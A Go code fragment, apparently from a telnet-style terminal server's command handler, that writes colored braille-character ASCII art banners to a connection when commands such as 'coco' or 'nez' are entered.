this.conn.Write([]byte("\033[1;49;36m⠛⠉⠄⠈⠱⡀⠄⠄⠄⠄⠄⠄⠄⠄⢸⡏⣶⣻⣻⣿⣿⣿⣮⣿⣻⣧⣤⣴⣿⣷⣶⣵⣶⣾⣿⢿⣷⣶⣜⣿⣿⣿⣿⠙⣿⣿⣿⣿⣿⣷⠎⡟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠸⣷⢿⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠄⠄⠄⠈⠛⠿⣿⣿⣿⡄⣿⣿⣿⣿⣿⢃⣡⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢿⣯⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠛⠃⢿⣿⣿⣿⡟⣾⡏⢀⠈⠐⢄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⡀⢄⢻⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠛⠛⢃⡏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢠⠄⠄⠄⠄⢸⢿⡈⠉⠉⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢸⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⡰⠂⠄⠄⠄⠄⠄⠄⠄⠘⡟⣇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡇⠄⠄⠄⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⡰⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠹⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⢰⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⢀⠇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⣾⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⢀⡏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⢸⣧⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠄⠄⠄⠂⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⢸⣿⡀⠄⠄⠄⠄⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢈⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⢘⠄⠃⠄⠄⠄⠄⠄⢀⡀⠄⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠠⠄⠂⠄⠄⠄⠆⠄⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
 continue
        }
if err != nil || cmd == "coco" || cmd == "COCO" {
this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣾⣿⣿⣿⣿⣿⡸⠄⣿⣿⠇⢸⣿⠟⣶⠛⠯⠁⠈⢌⠙⠋⠍⠻⠿⣿⣿⣿⣿⣿⣎⠧⣀⠄⠈⠲⡐⡐⠄⠐⠄⠄⠄⠄⠄⠄⠄⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣸⣿⣿⣿⡟⣿⡇⠇⢰⡟⡔⢠⣼⣏⣹⣿⣧⡁⣼⡀⠄⢓⣄⠄⠄⠄⢀⠘⠹⢿⣿⣸⣌⣵⣆⢄⠄⠈⠈⣎⠄⡄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿⠋⣉⢋⣵⢈⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⡿⢛⠛⠄⣿⣿⣿⣿⣿⣿⢻⠄⠸⠁⣍⡎⢿⢋⣛⣛⣛⣓⣛⡧⢵⣦⣙⢟⠾⣷⣶⣄⡤⣈⢾⣛⣭⣭⣶⣖⣶⣄⠄⠲⢤⢁⠄⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⠘⣿⣿⡟⣸⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣷⠘⢷⡇⣿⣿⣿⣿⢻⣿⠄⠄⢀⢀⣶⡁⡿⣿⣿⣿⣿⣿⣷⣻⣳⣿⣷⣳⣕⡗⢾⣍⣻⢷⣷⣜⢿⣿⣿⣿⣆⣿⣆⠐⠄⠙⣷⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣆⢹⣿⢁⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣿⣷⣤⣹⣿⣿⣿⣿⢾⣿⡇⠄⠈⠸⣏⣷⣷⣿⣿⣿⣿⣿⣿⣷⣷⣞⣿⣷⡻⣿⣦⣝⢿⣿⣾⣿⣳⡮⡻⣿⣿⣞⣿⣯⠸⡇⣿⣠⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣷⣧⣾⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡇⢸⠰⢀⡇⣽⣿⣿⡿⠿⠿⢿⣿⣟⡿⣿⣿⣯⣿⣝⡮⣿⣿⣿⣾⡿⡫⠗⠛⠈⠄⠄⠄⡈⣉⠉⠑⣷⣷⠄⠄⡄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣷⣦⡬⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⠜⡏⣿⢸⠄⢸⡈⠛⢉⡁⠄⠄⠄⠄⠄⠄⢈⢻⣿⣿⣿⣿⣿⣶⣝⣿⣿⠉⠄⠄⠄⠄⠄⠄⠄⠈⡽⠇⡄⣿⡏⠄⠄⣿⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⡿⢠⣿⣿⣿⣿⣿⣿⡿⣿⣿⢸⣧⢻⣿⣾⢸⡘⣧⠠⣿⠛⠿⠣⠄⠄⢀⣀⡀⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⠘⠟⠠⠄⠄⠒⠶⠆⢸⣾⡇⢿⠇⡆⠄⡿⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⢁⣿⣿⣿⣿⣿⣿⣿⣇⣿⣿⢸⠄⠄⢟⡍⢸⣧⠘⣆⣽⡀⠄⠄⠄⠄⠄⠈⠁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⣼⣿⡿⡞⠄⠃⠄⠃⠁⠄⠄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣞⣿⢸⠄⠄⠠⠊⠙⡿⣷⠹⡸⣷⣀⠄⠄⠄⠄⠄⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠄⠄⠄⢘⣶⣿⣿⠄⠄⠈⠄⠄⠄⠄⠄⠄⠨⢿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢨⢸⠄⠄⠄⠄⠄⠈⠻⣧⢱⢻⣿⣶⣤⣤⣤⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣿⣿⣿⡏⡼⠄⠄⠄⠄⠄⠄⠄⠄⢡⢦⡽⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⠄⠄⠄⠄⠄⠄⠄⠄⢬⣃⢏⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⠇⠄⠄⠄⠄⠄⠄⢀⠄⠈⣯⢹⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢧⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢿⣷⣤⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠄⠄⠄⠄⢀⡼⣼⣼⠄⣷⡀⣸⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢞⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠿⠿⠿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠄⠄⠄⡐⠄⡾⣹⣿⣿⢠⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣿⣿⣟⣴⣿⠄⠄⠄⠄⠄⠄⢀⠄⠤⠄⠘⢃⠁⠄⠄⠛⢿⣿⣿⣿⣿⣿⣿⣟⣻⣿⣟⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠄⠄⠄⠄⡡⢼⣃⠛⠿⣿⣼⣿⣿⣿⣿⣋⣙⣛⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠂⠄⠄⠄⢀⠲⠄⠊⠂⠄⠄⠄⠄⠄⠄⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠄⠄⠄⣠⠂⡀⠁⢿⡆⠄⠙⣿⣿⣿⣿⡇⢻⣿⣧⢸⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⡀⢠⢐⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣛⣵⠃⠄⠄⠄⠠⠄⠉⠁⠇⠄⢸⣿⠄⠄⢻⣿⣿⡟⠃⣼⣿⡿⢼⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⠋⡽⣿⣿⣿⣿⠁⠰⠑⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣶⣮⣭⣛⠻⠿⣿⣿⠟⣫⣵⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠁⠄⣼⣻⡇⠄⢸⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣧⢾⣷⡙⢿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡾⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⢀⣰⣟⣿⡇⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⠌⣿⡗⠊⢿⣿⣷⣴⣄⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢠⣿⣷⣯⣽⣻⢿⣿⣿⣿⣿⣿⣿⣿⣟⣯⣾⡇⣠⠄⠄⠄⠄⠄⠄⢸⣿⣿⡿⠄⠄⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣷⣴⣿⣿⣶⣿⣿⣿⣿⣿⣿⣷⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⣿⣿⣿⣿⣿⣿⣷⣯⣽⢟⣿⣿⢿⣿⣿⣿⡇⡇⠄⠄⠄⠄⠄⠄⣼⣿⡿⡇⠄⠄⣸⣿⣿⣿⣿⣿⣿⣿⡿⡟⡛\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣛⣩⣽⣶⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣰⣿⣷⡈⢿⣿⣿⣿⣿⣿⡿⠉⠄⠄⠄⠄⠹⣿⣿⣇⡷⢀⠄⠄⠄⢀⣾⡿⢿⠷⠄⠄⠄⢿⣿⣿⣿⣿⣿⣿⣿⡄⢾⣷\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⣿⣿⣿⢣⣿⣿⣿⡿⡿⢛⠛⠁⠄⠄⠄⠄⠄⠄⠄⠄⠙⠻⣿⣿⡄⠹⣿⣿⣿⡿⠁⠄⠄⠄⠄⠄⠄⢨⡻⣿⡸⣾⣤⡽⣶⣿⣿⣿⠟⠄⠄⠄⠄⠄⠈⠉⠉⠛⠛⠛⠻⣷⣌⢿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⣿⣿⣿⡿⣿⣏⣿⣾⣿⠏⠈⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠻⣿⣧⠘⣿⣟⣼⣆⠄⠄⠄⠄⠄⠄⢸⣿⣾⣻⠘⠷⠿⠿⠽⠿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣦\033[0m \r\n"))
this.conn.Write([]byte("\033[0;96m⣿⣿⣿⠉⢉⠋⡄⡜⣸⣿⣿⡿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠻⣧⠘⣾⣿⣿⡄⠄⠄⠄⠄⠄⢸⣿⣿⡟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⣿⣿\033[0m \r\n"))
		continue
        }
if err != nil || cmd == "nez" || cmd == "NEZ" {
this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠉⠛⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠛⢿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣈⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄⠄⠄⢀⣀⣠⣤⣤⣴⣶⣤⣤⣤⡀⠄⠛⠓⣤⣻⣿⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠄⠄⢀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡀⠄⠈⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠄⠄⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⢿⣿⣿⣷⠄⠄⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⣿⣿⣷⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⢠⣿⡿⢛⣛⡛⢿⣿⣿⣿⡟⢋⣭⣍⠛⣿⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠄⠄⠄⢀⣷⣴⣟⣙⣿⣿⣿⣿⣿⣿⣿⣏⣿⣿⣿⡀⠄⠄⠄⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠨⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠄⠄⠄⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠄⠄⠄⠄⠄⠄⠈⢩⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠈⠉⠉⠉⣉⣉⣉⣉⣉⡉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠁⠄⢠⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣠⣯⣟⣛⣛⣧⣾⣧⠄⠄⠄⠄⠄⠄⠄⠄⠸⣧⠄⠄⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⢰⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⣿⣟⣿⣿⣿⣿⣿⣿⡂⠄⠄⠄⠄⠄⠄⠄⠄⢿⡇⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⢸⡟⠄⠄⠄⠄⠄⠄⠄⠄⠄⣼⣷⣾⣿⣮⣻⣿⣿⣿⣿⣦⠄⠄⠄⠄⠄⠄⠄⠄⠘⠁⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
